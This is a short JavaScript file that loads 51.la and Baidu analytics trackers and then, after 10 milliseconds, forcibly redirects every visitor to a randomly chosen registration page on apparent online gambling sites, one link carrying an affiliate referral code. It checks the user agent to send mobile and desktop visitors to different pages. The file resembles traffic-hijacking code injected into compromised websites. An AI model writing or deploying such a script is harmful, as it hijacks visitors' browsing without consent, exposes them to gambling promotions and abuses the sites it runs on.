var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "//js.users.51.la/20675339.js";
	var s = document.getElementsByTagName("script")[0];
	s.parentNode.insertBefore(hm, s);
})();

var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "//hm.baidu.com/hm.js?0f7aff1f1419a377416168d9a5e7f2ca";
	var s = document.getElementsByTagName("script")[0];
	s.parentNode.insertBefore(hm, s);
})();

var Pcurl = ["https://www.long809.vip/new-signup.jsp", "https://www.yabo390.com/?i_code=4805261&", "https://www.long8631.com/new-signup.jsp"];
var Mturl = ["https://www.long809.vip/mobile/new/register.jsp", "https://www.yabo390.com/?i_code=4805261&", "https://www.long8631.com/mobile/new/register.jsp"];

function Mobile() {
	var sUserAgent = navigator.userAgent.toLowerCase();
	if ((sUserAgent.match(/(iPhone|iPod|Android|ios|iPad|ucweb|mobile)/i))) {
		return true;
	} else {
		return false;
	}
}
setTimeout(function() {
	if (Mobile()) {
		var rand = Math.floor((Math.random() * Mturl.length));
		window.location.href = Mturl[rand];
	} else {
		var rand = Math.floor((Math.random() * Pcurl.length));
		window.location.href = Pcurl[rand];
	}
}, 10);
